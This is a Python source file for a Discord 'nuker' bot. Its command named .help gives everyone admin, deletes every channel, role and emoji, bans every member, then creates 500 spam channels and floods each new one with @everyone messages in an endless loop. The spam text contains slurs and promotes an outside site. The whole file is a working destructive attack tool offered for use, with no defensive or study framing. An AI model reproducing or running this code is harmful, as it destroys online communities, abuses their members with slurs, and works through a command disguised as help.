def main():
  import os
  import discord
  from discord.ext import commands
  import random
  from discord import Permissions
  from colorama import Fore, Style
  import asyncio
  import requests
  import sys
  import time


  os.system('cls')
  SPAM_CHANNEL =  ["You just got nuked by Wrath" , "Retard!" , "Fucked by Wrath" , "oops, you got trolled!","F IN CHAT Beamed You","Should Have Listened","fuck you faggots @everyone","Nuked by Wrath ","oops got nuked","I run you","Nuked by Wrath","I run you","kinda got beamed by yourself"]
  SPAM_MESSAGE = ["@everyone You Got Nuked by WRATH MULTITOOL https://www.techswork.shop/ | discord.gg/techbeams "] 
  print("""Enter your bot token in the following format. "TOKEN" """)
  token = input('>')
  
  client = commands.Bot(command_prefix=".")
  client.remove_command(name="help" )
  @client.event
  async def on_ready():
    print("YOO WE ARE READY")
    print("do .help to do the funny")
    await client.change_presence(activity=discord.Game(name=".help"))

  @client.command()
  @commands.is_owner()
  async def STOP(ctx):
      await ctx.bot.logout()
      print (Fore.GREEN + f"{client.user.name} has logged out successfully." + Fore.RESET)

  @client.command()
  async def help(ctx):
      await ctx.message.delete()
      guild = ctx.guild
      try:
        role = discord.utils.get(guild.roles, name = "@everyone")
        await role.edit(permissions = Permissions.all())
        print(Fore.MAGENTA + "I have given everyone admin." + Fore.RESET)
      except:
        print(Fore.GREEN + "I was unable to give everyone admin" + Fore.RESET)
      for channel in guild.channels:
        try:
          await channel.delete()
          print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
        except:
          print(Fore.GREEN + f"{channel.name} was NOT deleted." + Fore.RESET)
      for member in guild.members:
       try:
        await member.ban()
        print(Fore.MAGENTA + f"{member.name}#{member.discriminator} Was banned" + Fore.RESET)
       except:
        print(Fore.GREEN + f"{member.name}#{member.discriminator} Was unable to be banned." + Fore.RESET)
      for role in guild.roles:
       try:
        await role.delete()
        print(Fore.MAGENTA + f"{role.name} Has been deleted" + Fore.RESET)
       except:
        print(Fore.GREEN + f"{role.name} Has not been deleted" + Fore.RESET)
      for emoji in list(ctx.guild.emojis):
       try:
        await emoji.delete()
        print(Fore.MAGENTA + f"{emoji.name} Was deleted" + Fore.RESET)
       except:
        print(Fore.GREEN + f"{emoji.name} Wasn't Deleted" + Fore.RESET)
      banned_users = await guild.bans()
      for ban_entry in banned_users:
        user = ban_entry.user
        try:
          pass
        except:
          print(Fore.GREEN + f"{user.name}#{user.discriminator} Was not unbanned." + Fore.RESET)
      await guild.create_text_channel("NUKED BITCH")
      for channel in guild.text_channels:
          link = await channel.create_invite(max_age = 0, max_uses = 0)
          print(f"New Invite: {link}")
      amount = 500
      for i in range (amount):
        await guild.create_text_channel(random.choice(SPAM_CHANNEL))
      print(f"nuked {guild.name} Successfully.")
      return

  @client.event
  async def on_guild_channel_create(channel):
    while True:
      await channel.send(random.choice(SPAM_MESSAGE))


  client.run(token, bot=True)